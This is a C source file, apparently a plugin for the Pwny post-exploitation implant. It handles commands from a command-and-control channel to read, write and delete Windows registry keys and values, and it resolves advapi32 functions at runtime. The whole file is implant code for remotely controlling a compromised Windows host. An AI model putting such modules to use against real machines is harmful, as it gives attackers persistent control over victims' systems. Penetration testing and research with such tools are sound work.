/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Registry COT plugin — read, write, and delete Windows registry values.
 */

#ifdef __windows__

#include <pwny/api.h>
#include <pwny/tlv_types.h>
#include <pwny/c2.h>

#include <windows.h>

#define COT_PLUGIN
#include <pwny/tab_cot.h>

/* ------------------------------------------------------------------ */
/* Constants                                                           */
/* ------------------------------------------------------------------ */


#define REGISTRY_READ \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL)

#define REGISTRY_WRITE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 1)

#define REGISTRY_DELETE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       TAB_BASE, \
                       API_CALL + 2)

#define TLV_TYPE_REG_HIVE \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE)

#define TLV_TYPE_REG_PATH \
        TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE)

#define TLV_TYPE_REG_KEY \
        TLV_TYPE_CUSTOM(TLV_TYPE_STRING, TAB_BASE, API_TYPE + 1)

#define TLV_TYPE_REG_TYPE \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)

#define TLV_TYPE_REG_VALUE \
        TLV_TYPE_CUSTOM(TLV_TYPE_BYTES, TAB_BASE, API_TYPE)

#define REG_HIVE_HKCR 0
#define REG_HIVE_HKCU 1
#define REG_HIVE_HKLM 2
#define REG_HIVE_HKU  3
#define REG_HIVE_HKCC 4

/* ------------------------------------------------------------------ */
/* Win32 typedefs                                                      */
/* ------------------------------------------------------------------ */

typedef LONG (WINAPI *fn_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG (WINAPI *fn_RegCreateKeyExA)(HKEY, LPCSTR, DWORD, LPSTR, DWORD,
                                          REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
typedef LONG (WINAPI *fn_RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD,
                                           LPBYTE, LPDWORD);
typedef LONG (WINAPI *fn_RegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD,
                                         const BYTE *, DWORD);
typedef LONG (WINAPI *fn_RegDeleteKeyA)(HKEY, LPCSTR);
typedef LONG (WINAPI *fn_RegDeleteValueA)(HKEY, LPCSTR);
typedef LONG (WINAPI *fn_RegCloseKey)(HKEY);

static struct
{
    fn_RegOpenKeyExA    pRegOpenKeyExA;
    fn_RegCreateKeyExA  pRegCreateKeyExA;
    fn_RegQueryValueExA pRegQueryValueExA;
    fn_RegSetValueExA   pRegSetValueExA;
    fn_RegDeleteKeyA    pRegDeleteKeyA;
    fn_RegDeleteValueA  pRegDeleteValueA;
    fn_RegCloseKey      pRegCloseKey;
} w;

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */

static HKEY registry_hive_to_hkey(int hive)
{
    switch (hive)
    {
        case REG_HIVE_HKCR: return HKEY_CLASSES_ROOT;
        case REG_HIVE_HKCU: return HKEY_CURRENT_USER;
        case REG_HIVE_HKLM: return HKEY_LOCAL_MACHINE;
        case REG_HIVE_HKU:  return HKEY_USERS;
        case REG_HIVE_HKCC: return HKEY_CURRENT_CONFIG;
        default:             return NULL;
    }
}

/* ------------------------------------------------------------------ */
/* Handlers                                                            */
/* ------------------------------------------------------------------ */

static tlv_pkt_t *registry_read(c2_t *c2)
{
    int hive;
    char path[512];
    char key[256];
    HKEY hRootKey, hKey;
    DWORD dwType, dwSize;
    BYTE *data;
    LONG status;
    tlv_pkt_t *result;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_REG_HIVE, &hive) < 0 ||
        tlv_pkt_get_string(c2->request, TLV_TYPE_REG_PATH, path) < 0 ||
        tlv_pkt_get_string(c2->request, TLV_TYPE_REG_KEY, key) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    hRootKey = registry_hive_to_hkey(hive);
    if (hRootKey == NULL)
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);

    status = w.pRegOpenKeyExA(hRootKey, path, 0, KEY_READ, &hKey);
    if (status != ERROR_SUCCESS)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    dwSize = 0;
    dwType = 0;
    w.pRegQueryValueExA(hKey, key, NULL, &dwType, NULL, &dwSize);

    if (dwSize == 0)
    {
        w.pRegCloseKey(hKey);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    data = (BYTE *)calloc(1, dwSize + 1);
    if (data == NULL)
    {
        w.pRegCloseKey(hKey);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    status = w.pRegQueryValueExA(hKey, key, NULL, &dwType, data, &dwSize);
    w.pRegCloseKey(hKey);

    if (status != ERROR_SUCCESS)
    {
        free(data);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_u32(result, TLV_TYPE_REG_TYPE, dwType);
    tlv_pkt_add_bytes(result, TLV_TYPE_REG_VALUE, data, dwSize);

    free(data);
    return result;
}

static tlv_pkt_t *registry_write(c2_t *c2)
{
    int hive, reg_type;
    char path[512];
    char key[256];
    HKEY hRootKey, hKey;
    LONG status;
    unsigned char *value;
    int value_size;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_REG_HIVE, &hive) < 0 ||
        tlv_pkt_get_string(c2->request, TLV_TYPE_REG_PATH, path) < 0 ||
        tlv_pkt_get_string(c2->request, TLV_TYPE_REG_KEY, key) < 0 ||
        tlv_pkt_get_u32(c2->request, TLV_TYPE_REG_TYPE, &reg_type) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    value_size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_REG_VALUE, &value);
    if (value_size < 0)
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);

    hRootKey = registry_hive_to_hkey(hive);
    if (hRootKey == NULL)
    {
        free(value);
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    status = w.pRegCreateKeyExA(hRootKey, path, 0, NULL,
                                REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL,
                                &hKey, NULL);
    if (status != ERROR_SUCCESS)
    {
        free(value);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    status = w.pRegSetValueExA(hKey, key, 0, (DWORD)reg_type, value, value_size);
    w.pRegCloseKey(hKey);
    free(value);

    if (status != ERROR_SUCCESS)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

static tlv_pkt_t *registry_delete(c2_t *c2)
{
    int hive;
    char path[512];
    char key[256];
    HKEY hRootKey, hKey;
    LONG status;
    int key_len;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_REG_HIVE, &hive) < 0 ||
        tlv_pkt_get_string(c2->request, TLV_TYPE_REG_PATH, path) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);
    }

    hRootKey = registry_hive_to_hkey(hive);
    if (hRootKey == NULL)
        return api_craft_tlv_pkt(API_CALL_USAGE_ERROR, c2->request);

    key_len = tlv_pkt_get_string(c2->request, TLV_TYPE_REG_KEY, key);

    if (key_len <= 0 || key[0] == '\0')
    {
        status = w.pRegDeleteKeyA(hRootKey, path);
    }
    else
    {
        status = w.pRegOpenKeyExA(hRootKey, path, 0, KEY_SET_VALUE, &hKey);
        if (status != ERROR_SUCCESS)
            return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

        status = w.pRegDeleteValueA(hKey, key);
        w.pRegCloseKey(hKey);
    }

    if (status != ERROR_SUCCESS)
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

/* ------------------------------------------------------------------ */
/* COT entry                                                           */
/* ------------------------------------------------------------------ */

COT_ENTRY
{
    w.pRegOpenKeyExA    = (fn_RegOpenKeyExA)cot_resolve("advapi32.dll", "RegOpenKeyExA");
    w.pRegCreateKeyExA  = (fn_RegCreateKeyExA)cot_resolve("advapi32.dll", "RegCreateKeyExA");
    w.pRegQueryValueExA = (fn_RegQueryValueExA)cot_resolve("advapi32.dll", "RegQueryValueExA");
    w.pRegSetValueExA   = (fn_RegSetValueExA)cot_resolve("advapi32.dll", "RegSetValueExA");
    w.pRegDeleteKeyA    = (fn_RegDeleteKeyA)cot_resolve("advapi32.dll", "RegDeleteKeyA");
    w.pRegDeleteValueA  = (fn_RegDeleteValueA)cot_resolve("advapi32.dll", "RegDeleteValueA");
    w.pRegCloseKey      = (fn_RegCloseKey)cot_resolve("advapi32.dll", "RegCloseKey");

    api_call_register(api_calls, REGISTRY_READ,   (api_t)registry_read);
    api_call_register(api_calls, REGISTRY_WRITE,  (api_t)registry_write);
    api_call_register(api_calls, REGISTRY_DELETE, (api_t)registry_delete);
}

#else /* POSIX */

#include <pwny/api.h>
#include <pwny/tab.h>

void register_tab_api_calls(api_calls_t **api_calls)
{
    (void)api_calls;
}

#endif
